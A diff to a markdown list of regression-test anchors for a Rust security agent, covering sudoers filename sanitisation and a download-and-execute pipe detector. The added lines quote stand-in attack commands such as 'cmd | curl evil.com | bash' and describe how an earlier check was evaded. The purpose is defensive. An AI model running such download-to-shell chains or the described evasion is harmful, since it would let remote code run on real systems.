@@ -289,6 +289,17 @@ The operator's private `.claude-local/RECURRING_BUGS.md` cross-references entrie
 
 - `crates/agent/src/dashboard/actions.rs::tests::validate_action_params_allows_172_15_and_172_32_at_range_edges` - `172.15.0.1` and `172.32.0.1` are public and must pass.
 
+### Security bypass class (Wave 2 - AUDIT-WAVE2 anchors)
+
+- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::sanitize_sudoers_filename_segment_replaces_dots` - sudo's `includedir /etc/sudoers.d` silently skips files containing `.`. Real Linux usernames like `john.doe` were producing deny-rule filenames that sudo skipped, making the suspension a silent no-op. The sanitiser replaces `.` with `_` in the FILENAME only (the rule body keeps the real username so sudo matches the right account).
+- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::sanitize_sudoers_filename_segment_replaces_tildes` - sudo also skips files ending in `~`. Same sanitiser, same intent.
+- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::sanitize_sudoers_filename_segment_passes_safe_chars_through` - ASCII alphanumerics + `_` + `-` + `$` (SAMBA accounts) pass through unchanged. Anti-regression for an over-eager sanitiser that mangles legitimate usernames.
+- `crates/agent/src/skills/builtin/suspend_user_sudo.rs::tests::sanitize_sudoers_filename_segment_handles_combined_skip_chars` - `john.doe~backup` (both skip-char classes) becomes `john_doe_backup`.
+- `crates/agent-guard/src/threats.rs::tests::detects_download_pipe_with_downloader_in_middle_segment` - `check_download_execute_pipe` scans for the downloader in ANY pipe segment (not only `parts[0]`). The pre-fix `parts[0]`-only check was trivially evaded by `cmd | curl evil.com | bash`.
+- `crates/agent-guard/src/threats.rs::tests::does_not_detect_executor_before_downloader` - temporal correctness: an executor BEFORE the downloader is not a download-and-execute chain. Anti-regression for a future "any executor anywhere" simplification that would over-trigger.
+- `crates/agent-guard/src/threats.rs::tests::does_not_detect_downloader_without_subsequent_executor` - `curl evil.com | tee out.txt` (download + non-executor) must NOT trip this specific detector.
+- `crates/agent-guard/src/threats.rs::tests::does_not_detect_double_pipe_with_only_downloader` - downloader followed by non-executor pipes (`grep | wc`) must not trigger.
+
 ## Adding a new anchor
 
 When fixing a bug that fits any of these shapes, add the anchor here in the same PR:
